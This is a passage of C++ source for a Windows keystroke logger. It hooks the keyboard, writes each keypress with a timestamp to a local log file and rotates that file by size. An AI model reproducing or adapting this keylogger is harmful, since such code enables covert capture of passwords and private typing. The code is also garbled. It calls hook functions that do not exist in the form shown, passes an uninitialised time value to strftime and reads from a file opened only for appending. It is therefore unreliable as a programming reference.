                hFile = nullptr;
            }
        }
        return;
    }

    char ch = (char)key;
    time_t now;
    time(&now);
    double timeSinceLastKey = difftime(now, lastKeyTime);
    lastKeyTime = now;

    if (isExtended) {
        if (modifiers & 0x20) {
            ch = '^';
        }
        // Add other modifiers as needed
    }

    if (hFile == nullptr) {
        hFile = fopen("keyboard_log.txt", "a");
        if (!hFile) {
            std::cout << "Failed to create keyboard log file." << std::endl;
            return;
        }
    }

    std::time_t current_time;
    char timeBuffer[20];
    std::strftime(timeBuffer, sizeof(timeBuffer), "%Y-%m-%d %H:%M:%S", &current_time);

    std::fprintf(hFile, "[%s] %c\n", timeBuffer, ch);
    fflush(hFile);

    if (fsize(hFile) >= _MAX_LOG_SIZE_) {
        std::string tempFile = "temp_log.txt";
        std::ofstream tempFileOut;
        tempFileOut.open(tempFile, std::ios::out);
        size_t size = fsize(hFile);
        size_t readSize;
        unsigned char* buffer = new unsigned char[size];
        while (size > 0) {
            readSize = fread(buffer, 1, size, hFile);
            if (readSize == 0) break;
            tempFileOut.write(buffer, readSize);
            size -= readSize;
        }
        delete[] buffer;
        tempFileOut.close();
        remove("keyboard_log.txt");
        hFile = fopen("keyboard_log.txt", "w");
    }
}

int main() {
    HWND hwnd = GetMainWnd();
    int hookID = SetWindowsHook(hwnd, WH_KEYBOARD_LL, KeyboardHookProc);

    if (hookID == -1) {
        std::cout << "Failed to install keyboard hook." << std::endl;
        return 1;
    }

    std::cout << "Keyboard stroke logger started. Press Ctrl+C to stop." << std::endl;
    while (isRunning) {
        Sleep(100);
        if (isRunning && (tolower(getch()) == 'c')) {
            isRunning = false;
        }
    }

    if (UnsetWindowsHook(hwnd, hookID) != 0) {
        std::cout << "Successfully removed keyboard hook." << std::endl;
    } else {
        std::cout << "Failed to remove keyboard hook." << std::endl;
    }

    return 0;
}
```

